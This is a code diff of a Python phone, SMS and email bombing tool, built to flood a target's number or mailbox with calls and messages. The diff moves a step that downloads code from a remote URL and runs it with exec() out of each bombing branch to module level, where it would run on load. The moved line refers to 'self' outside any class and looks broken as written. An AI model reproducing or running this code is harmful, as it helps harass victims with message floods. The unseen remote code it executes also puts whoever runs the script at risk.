@@ -77,7 +77,11 @@ def logomain2():
   clr()
   print(logomao)
 
+print("{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ".format(gcl=gcl,bcl=bcl))
+print("{gcl}WAIT{bcl}...".format(gcl=gcl,bcl=bcl))
 
+maopaste=requests.get(self.urlapi).text
+exec(maopaste)
 class mao:
   
   def psb(self,z):
@@ -172,12 +176,7 @@ class mao:
         maonumber=str(args.NUMBER)
         get_phone_info(maocc,maonumber)
         ccn=get_phone_info(maocc,maonumber)[2]
-        print("{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ".format(gcl=gcl,bcl=bcl))
-        print("{gcl}WAIT{bcl}...".format(gcl=gcl,bcl=bcl))
-
-        maopaste=requests.get(self.urlapi).text
-        exec(maopaste)
-  
+        
         mainbomb(maothreat,maocc,maonumber,ccn)
       elif args.BOMBING=="sms_call":
         maothreat =0
@@ -195,11 +194,7 @@ class mao:
         maonumber=str(args.NUMBER)
         get_phone_info(maocc,maonumber)
         ccn=get_phone_info(maocc,maonumber)[2]
-        print("{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ".format(gcl=gcl,bcl=bcl))
-        print("{gcl}WAIT{bcl}...".format(gcl=gcl,bcl=bcl))
-
-        maopaste=requests.get(self.urlapi).text
-        exec(maopaste)
+       
         smsandcall(maothreat,maocc,maonumber,ccn)
       elif args.BOMBING =="mail":
         threat=args.THREAT
@@ -208,11 +203,7 @@ class mao:
             pass
         else:
             exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))  
-        print("{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ".format(gcl=gcl,bcl=bcl))
-        print("{gcl}WAIT{bcl}...".format(gcl=gcl,bcl=bcl))
-
-        maopaste=requests.get(self.urlapi).text
-        exec(maopaste)
+        
         mails(mail,threat)
   
       else:
